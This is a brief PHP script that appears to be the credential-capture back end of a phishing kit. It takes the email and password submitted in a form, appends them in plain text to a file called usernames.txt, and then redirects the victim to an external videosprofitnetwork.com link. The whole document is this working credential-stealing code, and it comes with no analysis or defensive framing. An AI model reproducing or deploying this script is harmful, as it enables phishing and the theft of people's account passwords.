<?php

file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.videosprofitnetwork.com/watch.xml?key=080281f148d8edc6d8d718ea010b5cdf');
exit();
?>